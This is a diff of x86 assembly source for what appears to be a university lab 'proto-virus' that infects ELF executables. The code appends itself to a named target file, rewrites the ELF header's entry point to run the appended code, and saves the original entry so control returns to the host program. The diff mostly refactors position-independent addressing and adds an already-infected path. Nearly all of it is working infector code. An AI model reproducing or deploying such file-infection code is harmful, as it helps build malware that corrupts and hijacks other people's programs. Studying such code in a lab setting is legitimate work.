@@ -52,27 +52,21 @@
 %define ELFHDR_phoff	28
 
 %define FD dword [ebp - 4]
-%define ELF_header ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
-%define original_entry ebp - 60
+%define ELFHDR ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
+%define OG_entry ebp - 60
 
 	global _start
 
 	section .text
-_start:	
-	push	ebp
-	mov	ebp, esp
-	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
-	;CODE START
-	; Open file in FileName
-	call get_my_loc
-	add ebx, FileName			; Opening file in FileName
-	open ebx, RDWR, 0x777
-	mov FD, eax
 
+
+checkELF:
 	; Checking if file is an elf file
-	lea ecx, [ELF_header]		; Grabbing the effective address of elf header
-	read FD, ecx, ELFHDR_size
-	cmp dword [ELF_header], 0x464C457F
+	mov FD, eax
+	lea ecx, [ELFHDR]		; Grabbing the effective address of elf header
+	read FD, ecx, ELFHDR_size			; [ELFHDR] = E L F ........ ENTRY 
+	lea esi, [ecx]
+	cmp dword [esi], 0x464C457F
 	jne not_elf
 
 	; file is an ELF file, so we'll infect it
@@ -81,32 +75,32 @@ _start:
 infect:
 	; Print Outstr to STDOUT
 	call get_my_loc
-	add ebx, OutStr
-	write 1, ebx, 32
+	sub ecx, next_i - OutStr
+	write 1, ecx, 32
 
 	; Infect the file
 	lseek FD, 0, SEEK_END
-	mov esi, eax				; Save file size in esi
+	mov esi, eax				; save file size in esi
 	call get_my_loc
-	add ebx, _start
+	sub ecx, next_i - _start
 	mov edx, virus_end - _start
-	write FD, ebx, edx
+	write FD, ecx, edx
 
 	; Modify entry point
 	lseek FD, 0, SEEK_SET
-	mov eax, dword [ELF_header + ENTRY]
-	mov dword [original_entry], eax ; Save original entry point
+	mov eax, dword [ELFHDR + ENTRY]
+	mov dword [OG_entry], eax 	; Saving the original entry point
 	mov eax, 0x8048000 			; ELF base address
 	add eax, esi 				; Set eax to end of file
-	mov dword [ELF_header + ENTRY], eax
-	lea ecx, [ELF_header]		
+	mov dword [ELFHDR + ENTRY], eax
+	lea ecx, [ELFHDR]		
 	write FD, ecx, ELFHDR_size	; Writing the modified header
-	
-	; Changing return address
+
+	; Set PreviousEntryPoint to original entry point
 	lseek FD, -4, SEEK_END
-	lea ecx, [original_entry]
+	lea ecx, [OG_entry]
 	write FD, ecx, 4
-	; lseek FD, 0, SEEK_SET
+	lseek FD, 0 , SEEK_SET
 
 	close FD
 	jmp VirusExit
@@ -114,24 +108,58 @@ infect:
 not_elf:
 	close FD
 	call get_my_loc
-	add ebx, Failstr
-	write 1, ebx, 12
+	sub ecx, next_i - Failstr
+	write 1, ecx, 12
 	exit -1
+
+_start:	
+	push	ebp
+	mov	ebp, esp
+	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+	;CODE START
+
+	call get_my_loc
+	sub ecx, next_i - FileName
+	mov esi, ecx
+	open esi, RDWR, 0x777
+	cmp eax, 0
+	jg checkELF ; OF, SF, ZF
+	jmp infected
+
+infected:
+	; Print Outstr to STDOUT
+	call get_my_loc
+	sub ecx, next_i - OutStr2
+	mov esi, ecx
+	write 1, esi, 37
+	close FD
+	; Go to previous entry point
+	call get_my_loc
+	sub ecx, next_i - PreviousEntryPoint	
+	jmp [ecx]		;	WE don't know why this doesn't work without brackets
 
 VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
 	
+error:
+	call get_my_loc
+	sub ecx, next_i - Error
+	mov esi, ecx
+	write 1, esi, 5
+	exit -1
+
 FileName:	db "ELFexec", 0 ; default was with 1 but you gave us the file without it
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
+OutStr2:	db "The lab 9 proto-virus strikes back!", 10, 0
 Failstr:    db "perhaps not", 10 , 0
+Error:		db "ERROR", 10, 0
 
 
-get_my_loc:              ; puts location in ebx
+get_my_loc:              ; puts location in ecx
 	call next_i
 next_i:
-	pop ebx				; changed to ebx because this doesn't work with ecx 
-	sub ebx, next_i		; need to add sub because it doesn't subtract the address which screws things up
+	pop ecx
 	ret
 
 PreviousEntryPoint: dd VirusExit
